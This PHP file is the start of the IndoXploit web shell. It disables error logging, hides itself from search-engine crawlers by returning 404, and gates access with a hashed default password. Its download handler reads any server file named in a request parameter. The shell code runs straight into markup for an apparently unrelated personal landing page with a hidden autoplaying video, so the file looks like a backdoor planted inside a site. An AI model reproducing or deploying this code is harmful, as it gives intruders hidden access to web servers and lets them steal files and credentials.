<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
 
$auth_pass = "7b4939a8af28c814f0c757bb10f40d3d"; // default: IndoXploit
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
 
function login_shell() {
?>
<html>
<head>
<title>IndoXploit</title>
<style type="text/css">
html {
    margin: 20px auto;
    background: #000000;
    color: green;
    text-align: center;
}
header {
    color: green;
    margin: 10px auto;
}
input[type=password] {
    width: 250px;
    height: 25px;
    color: red;
    background: #000000;
    border: 1px dotted green;
    padding: 5px;
    margin-left: 20px;
    text-align: center;
}
</style>
</head>
<center>
<header>
    <pre>
 ___________________________
< root@indoxploit:~# w00t??? >
 ---------------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \
<----|====O)))==) \) /====
<----'    `--' `.__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/
 
    </pre>
</header>
<form method="post">
<input type="password" name="pass">
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>IndoXploit</title>
<meta name='author' content='IndoXploit'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
    font-size: 13px;
    width: 100%;
}
li {
    display: inline;
    margin: 5px;
    padding: 5px;
}
table, th, td {
    border-collapse:collapse;
    font-family: Tahoma, Geneva, sans-serif;
    background: transparent;
    font-family: 'Ubuntu';
    font-size: 13px;
}
.table_home, .th_home, .td_home {
    border: 1px solid #ffffff;
}
th {
    padding: 10px;
}
a {
    color: #ffffff;
    text-decoration: none;
}
a:hover {
    color: gold;
    text-decoration: underline;
}
b {
    color: gold;
}
input[type=text], input[type=password],input[type=submit] {
    background: transparent;
    color: #ffffff;
    border: 1px solid #ffffff;
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'Ubuntu';
    font-size: 13px;
}
textarea {
    border: 1px solid #ffffff;
    width: 100%;
    height: 400px;
    padding-left: 5px;
    margin: 10px auto;
    resize: none;
    background: transparent;
    color: #ffffff;
    font-family: 'Ubuntu';
    font-size: 13px;
}
select {
    width: 152px;
    background: #000000;
    color: lime;
    border: 1px solid #ffffff;
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'Ubuntu';
    font-size: 13px;
}
option:hover {
    background: lime;
    color: #000000;
}
</style>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>{{ }}</title>
    <!-- font awesome -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
    <!-- google fonts -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap">
    <!-- bootstrap core CSS-->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
    <!-- material design bootsrap -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.16.0/css/mdb.min.css">
    <!-- fonts -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Raleway:wght@500&display=swap">
    <link href="https://fonts.googleapis.com/css?family=Waiting+for+the+Sunrise" rel="stylesheet" type="text/css" />
    <!-- user style -->
    <link href="assets/css/style.css" rel="stylesheet">
</head>

<body>
    <div id="bg">
        <div id="particle-js"></div>
        <div class="container">
            <div class="text-container">
                <p id="typedtext"></p>
                <!-- <h1 class="line anim-typewriter">lalalalalal</h1>-->
                <!-- <h1>
                    <span class="typed-text"></span><span class="cursor typing">&nbsp;</span>

                </h1> -->

                <!-- <h4 id="quotes">Love chuuu</h4> -->
                <em id="quotes-author" class="text-muted">- dika</em>

            </div>
        </div>
    </div>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <script>
        particlesJS.load('particle-js', 'particle.json', function() {
            console.log('particle.json loaded...')
        })
    </script>
    <script type="text/javascript" src="assets/js/function.js"></script>
    <iframe src="https://www.youtube.com/embed/_QfPliSW83A?autoplay=1" type="audio/mp3" allow="autoplay" id="audio" style="display:none"></iframe>

</body>

</html>